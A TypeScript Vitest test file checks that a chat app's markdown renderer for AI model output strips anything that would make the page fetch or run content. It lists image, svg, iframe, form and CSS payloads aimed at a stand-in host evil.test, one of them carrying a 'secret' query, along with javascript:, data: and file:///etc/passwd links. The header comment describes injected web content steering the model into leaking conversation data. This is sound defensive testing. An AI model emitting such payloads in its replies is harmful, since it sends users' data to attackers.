/**
 * What a message may make the page fetch or do. The markdown is the model's,
 * and the model reads files and web pages written by anyone, so an address a
 * browser would load (a picture, an svg image, media, a stylesheet) can carry
 * what the conversation knows out of the app.
 */
import { describe, expect, it } from 'vitest'
import { chatMarkdownBlocks, renderChatMarkdown } from '../renderer/chat/ChatMarkdown'

const html = (text: string): string => renderChatMarkdown(text)

describe('chat markdown does not load anything', () => {
  const fetching = [
    '![x](https://evil.test/a.png?q=secret)',
    '<img src="https://evil.test/a.png">',
    '<svg><image href="https://evil.test/a.svg"/></svg>',
    '<svg onload="alert(1)"></svg>',
    '<video src="https://evil.test/v.mp4" poster="https://evil.test/p.png"></video>',
    '<audio src="https://evil.test/a.mp3"></audio>',
    '<picture><source srcset="https://evil.test/a.png"></picture>',
    '<div style="background:url(https://evil.test/a.png)">x</div>',
    '<input type="image" src="https://evil.test/a.png">',
    '<table background="https://evil.test/a.png"><tr><td>x</td></tr></table>',
    '<iframe src="https://evil.test"></iframe>',
    '<object data="https://evil.test"></object>',
    '<embed src="https://evil.test">',
    '<link rel="stylesheet" href="https://evil.test/a.css">',
    '<form action="https://evil.test"><button>go</button></form>',
    '<math><mi xlink:href="https://evil.test">x</mi></math>',
  ]
  for (const source of fetching) {
    it(source.slice(0, 48), () => {
      const out = html(source)
      expect(out).not.toMatch(
        /<(img|svg|image|video|audio|source|picture|iframe|object|embed|link|form|math|style|script)\b/i,
      )
      expect(out).not.toMatch(/\b(src|srcset|poster|background|style|action|data|xlink:href)\s*=/i)
      expect(out).not.toMatch(/\bon\w+\s*=/i)
      expect(out).not.toMatch(/<input[^>]*type="?image/i)
    })
  }

  it('keeps what markdown is made of', () => {
    const out = html(
      '# T\n\n**b** *i* ~~s~~ `c`\n\n- [x] done\n- [ ] todo\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```ts\nconst a = 1\n```\n\n[ok](https://example.test)',
    )
    for (const part of [
      '<h1',
      '<strong',
      '<em',
      '<del',
      '<code',
      'type="checkbox"',
      '<table',
      'language-ts',
      'href="https://example.test"',
    ]) {
      expect(out).toContain(part)
    }
  })

  it("cannot forge the page's own hooks or styles", () => {
    const out = html(
      '<button data-copy-code class="agent-chat-copy">x</button><div class="agent-chat-code" data-code-block>y</div>',
    )
    expect(out).not.toContain('data-copy-code')
    expect(out).not.toContain('<button')
    expect(out).not.toContain('agent-chat-')
    expect(out).not.toContain('data-code-block')
  })

  it('leaves no link that is not http(s) or mailto', () => {
    const out = html(
      '[a](javascript:alert(1)) [b](data:text/html,x) [c](file:///etc/passwd) [d](mailto:a@b.test)',
    )
    expect(out).not.toMatch(/href="(javascript|data|file):/i)
    expect(out).toContain('href="mailto:a@b.test"')
  })

  it('blocks are cut from the same sanitiser', () => {
    const parts = chatMarkdownBlocks('para\n\n<svg><image href="https://evil.test/a.svg"/></svg>')
    expect(parts.join('')).not.toMatch(/<(svg|image)\b/i)
  })
})
